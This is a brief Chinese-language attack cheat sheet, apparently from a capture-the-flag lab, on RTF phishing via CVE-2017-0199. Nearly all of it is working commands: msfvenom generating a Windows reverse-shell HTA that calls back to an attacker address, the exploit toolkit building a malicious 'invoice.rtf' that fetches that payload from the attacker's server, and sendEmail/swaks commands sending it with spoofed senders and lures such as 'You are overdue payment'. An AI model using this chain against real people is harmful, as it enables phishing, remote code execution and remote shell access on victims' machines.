# RTF Dynamite 钓鱼

遇到rtf字眼

主要来自于 CVE-2017-0199 exp在此

```clike
https://github.com/bhdresh/CVE-2017-0199
```

操作流程

```clike
1. 生成rtf反弹shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=8888 -f hta-psh -o msfv.hta
2. 利用exp将rtf编译成hta
python2 cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.8/msfv.hta -t rtf -x 0
3. 发送
sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.129.118.220 -v
或者
swaks --server 10.129.118.220 --from wolf@megabank.com --to nico@megabank.com  --header 'Subject:Please Review this' --attach invoice.rtf 
```
